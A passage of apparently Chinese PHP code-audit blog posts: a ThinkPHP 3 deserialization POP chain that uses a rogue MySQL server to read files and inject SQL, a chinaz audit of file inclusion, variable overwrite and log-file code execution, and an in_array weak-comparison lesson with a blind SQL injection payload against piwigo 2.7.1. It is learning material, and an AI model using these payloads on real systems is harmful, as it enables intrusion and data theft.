<p>这个POP链看起来比较鸡肋，因为必须先拿到数据库的配置文件才能注入。但是在MySQL攻击面这篇文章，第一种攻击面就是<strong>读取客户端任意文件</strong>，前提就是伪造一个恶意的MySQL服务端。那么我就可以先把配置文件写成恶意的MySQL服务端，再读取客户端的数据库配置文件，最后通过这个配置文件进行delete注入。</p>
<h3 id="恶意MySQL服务端">恶意MySQL服务端</h3>
<p><a href="https://github.com/allyshka/Rogue-MySql-Server">https://github.com/allyshka/Rogue-MySql-Server</a></p>
<p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20210120140208.png" alt=""></p>
<h3 id="POC">POC</h3>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">Think</span>\<span class="title">Db</span>\<span class="title">Driver</span>&#123;</span><br><span class="line">    <span class="title">use</span> <span class="title">PDO</span>;</span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">Mysql</span></span>&#123;</span><br><span class="line">        <span class="keyword">protected</span> $options = <span class="keyword">array</span>(</span><br><span class="line">            PDO::MYSQL_ATTR_LOCAL_INFILE =&gt; <span class="literal">true</span>    <span class="comment">// 开启才能读取文件</span></span><br><span class="line">        );</span><br><span class="line">        <span class="keyword">protected</span> $config = <span class="keyword">array</span>(</span><br><span class="line">            <span class="string">&#x27;type&#x27;</span>           =&gt; <span class="string">&#x27;mysql&#x27;</span>, <span class="comment">// 数据库类型</span></span><br><span class="line">            <span class="string">&#x27;hostname&#x27;</span>       =&gt; <span class="string">&#x27;127.0.0.1&#x27;</span>, <span class="comment">// 服务器地址</span></span><br><span class="line">            <span class="string">&#x27;database&#x27;</span>       =&gt; <span class="string">&#x27;tp3&#x27;</span>, <span class="comment">// 数据库名</span></span><br><span class="line">            <span class="string">&#x27;username&#x27;</span>       =&gt; <span class="string">&#x27;root&#x27;</span>, <span class="comment">// 用户名</span></span><br><span class="line">            <span class="string">&#x27;password&#x27;</span>       =&gt; <span class="string">&#x27;root&#x27;</span>, <span class="comment">// 密码</span></span><br><span class="line">            <span class="string">&#x27;hostport&#x27;</span>       =&gt; <span class="string">&#x27;3307&#x27;</span>, <span class="comment">// 端口</span></span><br><span class="line">            <span class="string">&#x27;dsn&#x27;</span>            =&gt; <span class="string">&#x27;&#x27;</span>, <span class="comment">//</span></span><br><span class="line">            <span class="string">&#x27;params&#x27;</span>         =&gt; <span class="keyword">array</span>(), <span class="comment">// 数据库连接参数</span></span><br><span class="line">            <span class="string">&#x27;charset&#x27;</span>        =&gt; <span class="string">&#x27;utf8&#x27;</span>, <span class="comment">// 数据库编码默认采用utf8</span></span><br><span class="line">            <span class="string">&#x27;prefix&#x27;</span>         =&gt; <span class="string">&#x27;&#x27;</span>, <span class="comment">// 数据库表前缀</span></span><br><span class="line">            <span class="string">&#x27;debug&#x27;</span>          =&gt; <span class="literal">false</span>, <span class="comment">// 数据库调试模式</span></span><br><span class="line">            <span class="string">&#x27;deploy&#x27;</span>         =&gt; <span class="number">0</span>, <span class="comment">// 数据库部署方式:0 集中式(单一服务器),1 分布式(主从服务器)</span></span><br><span class="line">            <span class="string">&#x27;rw_separate&#x27;</span>    =&gt; <span class="literal">false</span>, <span class="comment">// 数据库读写是否分离 主从式有效</span></span><br><span class="line">            <span class="string">&#x27;master_num&#x27;</span>     =&gt; <span class="number">1</span>, <span class="comment">// 读写分离后 主服务器数量</span></span><br><span class="line">            <span class="string">&#x27;slave_no&#x27;</span>       =&gt; <span class="string">&#x27;&#x27;</span>, <span class="comment">// 指定从服务器序号</span></span><br><span class="line">            <span class="string">&#x27;db_like_fields&#x27;</span> =&gt; <span class="string">&#x27;&#x27;</span>,</span><br><span class="line">        );</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">Think</span>&#123;</span><br><span class="line">    <span class="title">use</span> <span class="title">Think</span>\<span class="title">Db</span>\<span class="title">Driver</span>\<span class="title">Mysql</span>;</span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">Model</span></span>&#123;</span><br><span class="line">        <span class="keyword">protected</span> $pk = <span class="string">&#x27;id&#x27;</span>;</span><br><span class="line">        <span class="keyword">protected</span> $options   = <span class="keyword">array</span>();</span><br><span class="line">        <span class="keyword">protected</span> $data = <span class="keyword">array</span>();</span><br><span class="line">        <span class="keyword">protected</span> $db = <span class="literal">null</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">        </span>&#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;db = <span class="keyword">new</span> Mysql();</span><br><span class="line">            <span class="keyword">$this</span>-&gt;options[<span class="string">&#x27;where&#x27;</span>] = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;data[<span class="keyword">$this</span>-&gt;pk] = <span class="keyword">array</span>(</span><br><span class="line">                <span class="string">&quot;table&quot;</span> =&gt; <span class="string">&quot;mysql.user where 1=updatexml(1,user(),1)#&quot;</span>,</span><br><span class="line">                <span class="string">&quot;where&quot;</span> =&gt; <span class="string">&quot;1=1&quot;</span></span><br><span class="line">            );</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">Think</span>\<span class="title">Session</span>\<span class="title">Driver</span>&#123;</span><br><span class="line">    <span class="title">use</span> <span class="title">Think</span>\<span class="title">Model</span>;</span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">Memcache</span></span>&#123;</span><br><span class="line">        <span class="keyword">protected</span> $handle;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">        </span>&#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;handle = <span class="keyword">new</span> Model();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">Think</span>\<span class="title">Image</span>\<span class="title">Driver</span>&#123;</span><br><span class="line">    <span class="title">use</span> <span class="title">Think</span>\<span class="title">Session</span>\<span class="title">Driver</span>\<span class="title">Memcache</span>;</span><br><span class="line">    <span class="keyword">use</span> <span class="title">Think</span>\<span class="title">Image</span>;</span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">Imagick</span></span>&#123;</span><br><span class="line">        <span class="keyword">private</span> $img;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">        </span>&#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;img = <span class="keyword">new</span> Memcache();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> &#123;</span><br><span class="line">    <span class="title">echo</span> <span class="title">base64_encode</span>(<span class="title">serialize</span>(<span class="title">new</span> <span class="title">Think</span>\<span class="title">Image</span>\<span class="title">Driver</span>\<span class="title">Imagick</span>()));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20210120143657.png" alt=""></p>
<p>然后发送请求，可以在mysql.log中看到读取的文件信息：</p>
<p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20210120143611.png" alt=""></p>
<p>接下来就是更改POC中数据库的相关配置为mysql.log中读取的到的内容即可。</p>
<p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20210120143910.png" alt=""></p>
]]></content>
      <categories>
        <category>代码审计</category>
        <category>PHP</category>
      </categories>
      <tags>
        <tag>代码审计</tag>
      </tags>
  </entry>
  <entry>
    <title>PHP代码审计——chinaz</title>
    <url>/code_audit/PHP/2.PHP%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E5%A4%8D%E7%8E%B0%E2%80%94%E2%80%94chinaz/</url>
    <content><![CDATA[<h1 id="PHP代码审计学习——chinaz">PHP代码审计学习——chinaz</h1>
<h2 id="0x01-审计入口">0x01 审计入口</h2>
<p>首先chinaz没有后台数据库，并且是一个单入口类，不同于上一篇Yixuncms是一个MVC的架构模式。</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">// index.php</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">require_once</span>(<span class="string">&quot;library/common.php&quot;</span>);</span><br><span class="line"><span class="keyword">require_once</span>(<span class="string">&quot;library/view.php&quot;</span>);</span><br><span class="line">$view_class = <span class="keyword">new</span> View();</span><br><span class="line">$data = <span class="keyword">array</span>();</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($_GET[<span class="string">&#x27;page&#x27;</span>]))</span><br><span class="line">&#123;</span><br><span class="line">	$data[<span class="string">&#x27;page&#x27;</span>] = filter($_GET[<span class="string">&#x27;page&#x27;</span>]);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">	$data[<span class="string">&#x27;page&#x27;</span>] = <span class="string">&#x27;js&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line">$view_class-&gt;echoContent($data[<span class="string">&#x27;page&#x27;</span>], $data);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p>在index.php文件中可以看到首先包含了公共文件和渲染文件进来，然后new了一个View类的对象。</p>
<p>接着检测是否以get方式传入page变量，如果有则调用filter方法过滤变量中的数据，最后再调用<code>echoContent</code>方法加载页面。</p>
<img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20200606170628.png" style="zoom:50%;" />
<p>那么网站的目录结构也就大概清楚了，<code>library</code>中包含公共文件和渲染文件，<code>logs</code>中记录日志，<code>static</code>是一些静态资源文件，<code>views</code></p>
<p>类似视图文件，文件中包含了HTML代码，各个模块通过<code>action.php</code>POST参数跳转到相应功能模块的PHP文件。</p>
<h2 id="0x02-工具扫描">0x02 工具扫描</h2>
<p>首先上工具，用Seay和rips扫一遍：</p>
<p>rips结果：</p>
<p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20200606170001.png" alt=""></p>
<p>Seay结果：</p>
<p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20200606170025.png" alt=""></p>
<p>这两个工具都提到了<code>action.php</code>中的<code>require_once()</code>函数，那就从这个地方出发。</p>
<h2 id="0x03-审计过程">0x03 审计过程</h2>
<h3 id="action-php文件包含"><code>action.php</code>文件包含</h3>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">//action.php</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">require_once</span>(<span class="string">&quot;library/common.php&quot;</span>);</span><br><span class="line"><span class="keyword">require_once</span>(<span class="string">&quot;library/view.php&quot;</span>);</span><br><span class="line">$page = filter($_POST[<span class="string">&#x27;page&#x27;</span>]).<span class="string">&#x27;.php&#x27;</span>;</span><br><span class="line">$post_data = <span class="keyword">array</span>();</span><br><span class="line"><span class="keyword">foreach</span> ($_POST <span class="keyword">as</span> $key =&gt; $value) &#123;</span><br><span class="line">	$post_data[$key] = $value;</span><br><span class="line">&#125;</span><br><span class="line">@<span class="keyword">require_once</span>($page);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p>POST一个<code>page</code>变量时，经过<code>filter</code>函数处理，最后利用<code>require_once()</code>包含进来。</p>
<p><code>filter()</code>函数了过滤<code>.</code>，并且限定了文件后缀名为<code>.php</code>，那么这个点的利用思路就比较清晰了：使用绝对路径的方式传入<code>$page</code>参数读取本地文件，另外，如果PHP版本小于5.4.3，还可以使用<code>%00</code>截断的方式读取任意后缀名的文件。</p>
<p>利用方式：</p>
<p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20200606181932.png" alt=""></p>
<h3 id="normaliz-php变量覆盖"><code>normaliz.php</code>变量覆盖</h3>
<p>根据工具扫描结果审计<code>normaliz.php</code>文件。</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">// normaliz.php</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">require_once</span>(<span class="string">&quot;library/common.php&quot;</span>);</span><br><span class="line"><span class="keyword">require_once</span>(<span class="string">&quot;library/view.php&quot;</span>);</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">action</span>(<span class="params">$post_data, $ip_replacement, $mail_replacement</span>)</span>&#123;</span><br><span class="line">	<span class="keyword">foreach</span> ($post_data <span class="keyword">as</span> $key =&gt; $value) &#123;</span><br><span class="line">		$$key = $value;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">try</span>&#123;</span><br><span class="line">		<span class="keyword">if</span> ($method == <span class="string">&#x27;/\\d+\\.\\d+\\.\\d+\\.\\d+/&#x27;</span>)</span><br><span class="line">		&#123;</span><br><span class="line">			$res = preg_replace($method, $ip_replacement, $source);</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">else</span></span><br><span class="line">		&#123;</span><br><span class="line">			$res = preg_replace($method, $mail_replacement, $source);</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">catch</span>(<span class="built_in">Exception</span> $e)</span><br><span class="line">	&#123;</span><br><span class="line">		write_log($e-&gt;getMessage());</span><br><span class="line">		$res=$source;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">return</span> $res;</span><br><span class="line">&#125;</span><br><span class="line">$view_class = <span class="keyword">new</span> View();</span><br><span class="line">$data = <span class="keyword">array</span>();</span><br><span class="line">$data[<span class="string">&#x27;page&#x27;</span>] = <span class="string">&#x27;normaliz&#x27;</span>;</span><br><span class="line">$ip_replacement = <span class="string">&#x27;222.222.222.222&#x27;</span>;</span><br><span class="line">$mail_replacement = <span class="string">&#x27;lollol@lol.com&#x27;</span>;</span><br><span class="line">$data[<span class="string">&#x27;res&#x27;</span>] = action($post_data, $ip_replacement, $mail_replacement);</span><br><span class="line">$view_class-&gt;echoContent($data[<span class="string">&#x27;page&#x27;</span>], $data);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p>第12行和16行代码看到一个比较敏感的函数<code>preg_replace()</code>，在PHP7.0版本之前可以使用<code>/e</code>模式执行PHP代码。</p>
<p>其中都需要传入三个参数：<code>$method</code>、<code>$ip_replacement</code>或<code>$mail_repalcement</code>、<code>$source</code>，这三个参数都可以通过第7行的<code>$$</code>操作符进行变量覆盖。而<code>post_data</code>参数是在<code>action.php</code>通过POST来赋值，那么利用方式就比较清楚了：</p>
<p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20200606224027.png" alt=""></p>
<h3 id="common-php任意文件写入"><code>common.php</code>任意文件写入</h3>
<p>首先看到<code>file_put_contents()</code>函数</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">// common.php</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">write_log</span>(<span class="params">$input</span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">global</span> $cfg_logfile;</span><br><span class="line">    file_put_contents($cfg_logfile, $input, FILE_APPEND);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>全局查找<code>$cfg_logfile</code>参数</p>
<img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20200606225336.png" style="zoom:67%;" />
<p>回溯<code>$input</code>参数，发现<code>load_file()</code>中调用了<code>write_log()</code>函数：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">// common.php</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">loadFile</span>(<span class="params">$filePath</span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">global</span> $cfg_basedir;</span><br><span class="line">	<span class="keyword">if</span>(!file_exists($filePath))&#123;</span><br><span class="line">		write_log(<span class="string">&#x27;Try to open Null file:&#x27;</span>.$filePath);</span><br><span class="line">		<span class="keyword">return</span> file_get_contents($cfg_basedir.<span class="string">&#x27;/error.php&#x27;</span>);</span><br><span class="line">	&#125;</span><br><span class="line">	$fp = @fopen($filePath,<span class="string">&#x27;r&#x27;</span>);</span><br><span class="line">	$sourceString = @fread($fp,filesize($filePath));</span><br><span class="line">	@fclose($fp);</span><br><span class="line">	<span class="keyword">return</span> $sourceString;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>回溯<code>$file_path</code>参数，发现在<code>view.php</code>中的<code>echo_content()</code>调用了<code>loadfile()</code>函数：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">// view.php</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">echoContent</span>(<span class="params">$vId, $data</span>)</span></span><br><span class="line"><span class="function">	</span>&#123;</span><br><span class="line">		<span class="keyword">$this</span>-&gt;data = $data;</span><br><span class="line">		$content = loadFile(<span class="string">&quot;views/&quot;</span>.$vId.<span class="string">&quot;.php&quot;</span>);</span><br><span class="line">		$content = <span class="keyword">$this</span>-&gt;parseHeadAndFoot($content);</span><br><span class="line">		$content = <span class="keyword">$this</span>-&gt;parseVal($content);</span><br><span class="line">		$content = <span class="keyword">$this</span>-&gt;parseIf($content);</span><br><span class="line">		<span class="keyword">echo</span> $content;</span><br><span class="line">	&#125;</span><br></pre></td></tr></table></figure>
<p>接着回溯<code>$vId</code>参数，查看<code>echoContent()</code>函数的调用情况：</p>
<img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20200606230150.png" style="zoom:67%;" />
<p>主要是分两大类：</p>
<ol>
<li><code>phpcom.php</code>、<code>md5.php</code>和<code>normaliz.php</code>都是在<code>action.php</code>中通过传入page变量，从而包含进来的，故不可控；</li>
<li><code>index.php</code>下传入的是page变量</li>
</ol>
<p>那个就可以通过GET方式给<code>page</code>变量赋值，写入文件内容，然后通过<code>write_log()</code>函数写入<code>logfile.php</code>文件中，利用方式：</p>
<p>先写入<code>&lt;?php phpinfo(); ?&gt;</code></p>
<p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20200606231535.png" alt=""></p>
<p>接着通过<code>action.php</code>文件包含来执行命令：</p>
<p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20200606231812.png" alt=""></p>
<blockquote>
<p>其实这里用php文件去存储日志就很离谱。</p>
</blockquote>
<h3 id="view-php代码执行"><code>view.php</code>代码执行</h3>
<p>这个点还是比较有难度的</p>
<p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20200606234400.png" alt=""></p>
<p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20200606235724.png" alt=""></p>
<p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20200606235830.png" alt=""></p>
<p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20200606235923.png" alt=""></p>
]]></content>
      <categories>
        <category>代码审计</category>
        <category>PHP</category>
      </categories>
      <tags>
        <tag>代码审计</tag>
      </tags>
  </entry>
  <entry>
    <title>PHP代码审计学习——Day1</title>
    <url>/code_audit/PHP/3.PHP%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E5%AD%A6%E4%B9%A0%E2%80%94%E2%80%94Day1/</url>
    <content><![CDATA[<h1 id="PHP代码审计学习——Day1-in-array函数缺陷">PHP代码审计学习——Day1 in_array函数缺陷</h1>
<blockquote>
<p>学习资源均来自于<a href="https://mochazz.github.io/">mochazz</a>师傅，感谢红日安全代码审计小组的分享</p>
</blockquote>
<h2 id="0x01-Day1-Wish-List">0x01 Day1 - Wish List</h2>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Challenge</span> </span>&#123;</span><br><span class="line">  <span class="keyword">const</span> UPLOAD_DIRECTORY = <span class="string">&#x27;./solutions/&#x27;</span>;</span><br><span class="line">  <span class="keyword">private</span> $file;</span><br><span class="line">  <span class="keyword">private</span> $whitelist;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params">$file</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">$this</span>-&gt;file = $file;</span><br><span class="line">    <span class="keyword">$this</span>-&gt;whitelist = range(<span class="number">1</span>, <span class="number">24</span>);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (in_array(<span class="keyword">$this</span>-&gt;file[<span class="string">&#x27;name&#x27;</span>], <span class="keyword">$this</span>-&gt;whitelist)) &#123;</span><br><span class="line">      move_uploaded_file(</span><br><span class="line">        <span class="keyword">$this</span>-&gt;file[<span class="string">&#x27;tmp_name&#x27;</span>],</span><br><span class="line">        <span class="built_in">self</span>::UPLOAD_DIRECTORY . <span class="keyword">$this</span>-&gt;file[<span class="string">&#x27;name&#x27;</span>]</span><br><span class="line">      );</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$challenge = <span class="keyword">new</span> Challenge($_FILES[<span class="string">&#x27;solution&#x27;</span>]);</span><br></pre></td></tr></table></figure>
<p>这一关卡考察的是一个任意文件上传漏洞，主要问题出在<code>in_array</code>函数，来看官方文档对这个函数的解释：</p>
<blockquote>
<p>in_array (PHP 4, PHP 5, PHP 7)</p>
<p>功能：检查数组中是否存在某个值</p>
<p>定义：in_array ( <a href="https://www.php.net/manual/zh/language.pseudo-types.php#language.types.mixed">mixed</a> <code>$needle</code> , array <code>$haystack</code> [, bool <code>$strict</code> = <strong><code>FALSE</code></strong> ] ) : bool</p>
<p>在 <strong>$haystack</strong> 中搜索 <strong>$needle</strong> ，如果第三个参数 <strong>$strict</strong> 的值为 <strong>TRUE</strong> ，则 <strong>in_array()</strong> 函数会进行强检查，检查 <strong>$needle</strong> 的类型是否和 <strong>$haystack</strong> 中的相同。如果找到 <strong>$haystack</strong> ，则返回 <strong>TRUE</strong>，否则返回 <strong>FALSE</strong>。</p>
</blockquote>
<p>由于该函数并未将第三个参数设置为，所以攻击者可以利用此处构造文件名为7shell.php，<code>in_array()</code>函数会将7shell.php强制转换为数字7，数字7在<code>$this-&gt; whitelist</code>也就是数组的1-24中，绕过<code>in_array()</code>的函数判断，可以构造任意文件上传漏洞。</p>
<p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20200609164117.png" alt=""></p>
<h2 id="0x02-实例分析-piwigo2-7-1">0x02 实例分析 - piwigo2.7.1</h2>
<p>首先安装好网站后，随便发布一张图片，漏洞的入口文件在 <code>picture.php</code> 中，具体代码如下：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">// picture.php</span></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($_GET[<span class="string">&#x27;action&#x27;</span>]))</span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">switch</span> ($_GET[<span class="string">&#x27;action&#x27;</span>])</span><br><span class="line">  &#123;</span><br><span class="line">......</span><br><span class="line">    <span class="keyword">case</span> <span class="string">&#x27;rate&#x27;</span> :</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">include_once</span>(PHPWG_ROOT_PATH.<span class="string">&#x27;include/functions_rate.inc.php&#x27;</span>);</span><br><span class="line">      rate_picture($page[<span class="string">&#x27;image_id&#x27;</span>], $_POST[<span class="string">&#x27;rate&#x27;</span>]);</span><br><span class="line">      redirect($url_self);</span><br><span class="line">    &#125;</span><br><span class="line">......</span><br></pre></td></tr></table></figure>
<p>当<code> $_GET[‘action’]</code> 为 <strong>rate</strong> 的时候，就会调用文件 <code>include/functions_rate.inc.php</code> 中的 <code>rate_picture</code> 方法，而漏洞便存在这个方法中。</p>
<p>跟入<code>rate_picture</code> 函數，函数对 <code>$rate</code> 变量进行检测，判断 ​<code>rate</code> 是否在 ​<code>$conf[‘rate_items’]</code> 中， ​<code>$conf[‘rate_items’]</code> 的内容可以在<code> include\config_default.inc.php</code> 中找到，为 <code>$conf['rate_items'] = array(0,1,2,3,4,5);</code></p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">rate_picture</span>(<span class="params">$image_id, $rate</span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">global</span> $conf, $user;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (!<span class="keyword">isset</span>($rate)</span><br><span class="line">      <span class="keyword">or</span> !$conf[<span class="string">&#x27;rate&#x27;</span>]</span><br><span class="line">      <span class="keyword">or</span> !in_array($rate, $conf[<span class="string">&#x27;rate_items&#x27;</span>]))</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  $user_anonymous = is_autorize_status(ACCESS_CLASSIC) ? <span class="literal">false</span> : <span class="literal">true</span>;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> ($user_anonymous <span class="keyword">and</span> !$conf[<span class="string">&#x27;rate_anonymous&#x27;</span>])</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  ......</span><br><span class="line">  $query = <span class="string">&#x27;</span></span><br><span class="line"><span class="string">INSERT</span></span><br><span class="line"><span class="string">  INTO &#x27;</span>.RATE_TABLE.<span class="string">&#x27;</span></span><br><span class="line"><span class="string">  (user_id,anonymous_id,element_id,rate,date)</span></span><br><span class="line"><span class="string">  VALUES</span></span><br><span class="line"><span class="string">  (&#x27;</span></span><br><span class="line">    .$user[<span class="string">&#x27;id&#x27;</span>].<span class="string">&#x27;,&#x27;</span></span><br><span class="line">    .<span class="string">&#x27;\&#x27;&#x27;</span>.$anonymous_id.<span class="string">&#x27;\&#x27;,&#x27;</span></span><br><span class="line">    .$image_id.<span class="string">&#x27;,&#x27;</span></span><br><span class="line">    .$rate</span><br><span class="line">    .<span class="string">&#x27;,NOW())</span></span><br><span class="line"><span class="string">;&#x27;</span>;</span><br><span class="line">  pwg_query($query);</span><br></pre></td></tr></table></figure>
<p>由于这里（第7行）并没有将 <code>in_array()</code> 函数的第三个参数设置为 <code>true</code> ，所以会进行弱比较，可以绕过。比如我们将 <code>$rate</code> 的值设置成 <code>1,1 and if(ascii(substr((select database()),1,1))=112,1,sleep(3)));#</code> 那么SQL语句就变成：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">INSERT INTO piwigo_rate (user_id,anonymous_id,element_id,rate,date) VALUES (2,&#39;192.168.2&#39;,1,1,1 and if(ascii(substr((select database()),1,1))&#x3D;112,1,sleep(3)));#,NOW()) ;</span><br></pre></td></tr></table></figure>
<h2 id="0x03-练习题">0x03  练习题</h2>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">//index.php</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">include</span> <span class="string">&#x27;config.php&#x27;</span>;</span><br><span class="line">$conn = <span class="keyword">new</span> mysqli($servername, $username, $password, $dbname);</span><br><span class="line"><span class="keyword">if</span> ($conn-&gt;connect_error) &#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&quot;连接失败: &quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$sql = <span class="string">&quot;SELECT COUNT(*) FROM users&quot;</span>;</span><br><span class="line">$whitelist = <span class="keyword">array</span>();</span><br><span class="line">$result = $conn-&gt;query($sql);</span><br><span class="line"><span class="keyword">if</span>($result-&gt;num_rows &gt; <span class="number">0</span>)&#123;</span><br><span class="line">    $row = $result-&gt;fetch_assoc();</span><br><span class="line">    $whitelist = range(<span class="number">1</span>, $row[<span class="string">&#x27;COUNT(*)&#x27;</span>]);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$id = stop_hack($_GET[<span class="string">&#x27;id&#x27;</span>]);</span><br><span class="line">$sql = <span class="string">&quot;SELECT * FROM users WHERE id=<span class="subst">$id</span>&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (!in_array($id, $whitelist)) &#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&quot;id <span class="subst">$id</span> is not in whitelist.&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$result = $conn-&gt;query($sql);</span><br><span class="line"><span class="keyword">if</span>($result-&gt;num_rows &gt; <span class="number">0</span>)&#123;</span><br><span class="line">    $row = $result-&gt;fetch_assoc();</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;&lt;center&gt;&lt;table 